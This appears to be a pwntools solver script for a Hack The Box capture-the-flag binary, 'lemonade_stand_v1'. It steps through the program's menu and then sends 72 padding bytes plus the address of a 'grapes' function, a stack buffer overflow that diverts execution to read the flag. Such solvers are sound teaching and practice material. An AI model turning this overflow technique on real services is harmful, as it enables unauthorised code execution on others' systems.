#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './lemonade_stand_v1' 

LOCAL = False

os.system('clear')

sla = lambda x,y : r.sendlineafter(x,y)

# Open local process or remote connection
if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

e = ELF(fname)

# Reduce coinds to call save_creds
[sla('>> ', '2') for i in range(3)]

# Yes
sla('>>', '1')

# Fill name
sla('name: ', 'htb')

# Overflow the buffer
sla('surname: ', b'A'*72 + p64(e.sym.grapes))

# Read flag
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
